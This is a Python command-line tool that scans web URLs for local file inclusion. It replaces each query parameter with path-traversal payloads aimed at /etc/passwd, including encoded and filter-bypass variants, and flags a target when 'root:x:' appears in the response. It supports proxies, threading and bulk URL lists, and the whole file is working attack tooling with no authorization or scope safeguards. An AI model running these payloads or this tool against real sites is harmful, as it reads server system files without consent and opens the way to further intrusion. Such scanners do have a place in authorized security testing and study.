import argparse
import requests
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

class LFIScanner:
    def __init__(self, threads=5, proxy=None):
        self.threads = threads
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.payloads = ["../../etc/passwd", "%2e%2e%2fetc/passwd", "....//....//etc/passwd"]

    def scan_url(self, url):
        # Check for parameters in URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"[!] No parameters found in URL. Crawling not implemented yet.")
            return []
        
        vulnerable = []
        for param in params:
            for payload in self.payloads:
                test_url = self._inject_payload(url, param, payload)
                if self._is_vulnerable(test_url):
                    print(f"[+] Vulnerable: {test_url}")
                    vulnerable.append((param, payload))
        return vulnerable

    def _inject_payload(self, url, param, payload):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = "&".join([f"{k}={v[0]}" for k, v in query.items()])
        return parsed._replace(query=new_query).geturl()

    def _is_vulnerable(self, url):
        try:
            response = requests.get(url, proxies=self.proxies, timeout=10)
            return "root:x:" in response.text
        except:
            return False

def main():
    parser = argparse.ArgumentParser(description="LFI Scanner")
    parser.add_argument("-u", "--url", help="Single URL to test")
    parser.add_argument("-f", "--file", help="File containing list of URLs")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-p", "--proxy", help="Proxy (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    scanner = LFIScanner(threads=args.threads, proxy=args.proxy)
    
    if args.url:
        results = scanner.scan_url(args.url)
    elif args.file:
        with open(args.file, "r") as f:
            urls = f.read().splitlines()
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(scanner.scan_url, urls)
    else:
        print("[-] Please specify a URL or file")

if __name__ == "__main__":
    main()
